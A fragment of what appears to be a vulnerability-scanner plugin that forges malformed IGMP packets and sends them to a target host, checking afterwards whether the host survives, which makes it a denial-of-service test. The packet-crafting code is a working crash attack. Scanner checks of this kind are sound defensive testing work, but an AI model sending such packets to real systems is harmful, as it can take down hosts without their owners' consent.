...
dstaddr = get_host_ip();
srcaddr = this_host();
ip = forge_ip_packet( ip_v: 4, ip_hl: 7, ip_tos: 0, ip_len: 20, ip_off: 0, ip_p: IPPROTO_IGMP, ip_id: 18277, ip_ttl: 1, ip_src: srcaddr, ip_dst: dstaddr );
igmp1 = forge_igmp_packet( ip: ip, type: 0x11, code: 0xff, group: "224.0.0.1" );
start_denial();
result = send_packet( packet: igmp1, pcap_active: FALSE );
igmp2 = forge_igmp_packet( ip: ip, type: 0x11, code: 0x00, group: "0.0.0.0", data: "haha", update_ip_len: FALSE );
igmp2 = set_ip_elements( ip: igmp2, ip_len: 28, ip_id: 18278 );
result = send_packet( packet: igmp2, pcap_active: FALSE );
alive = end_denial();
if(!alive){
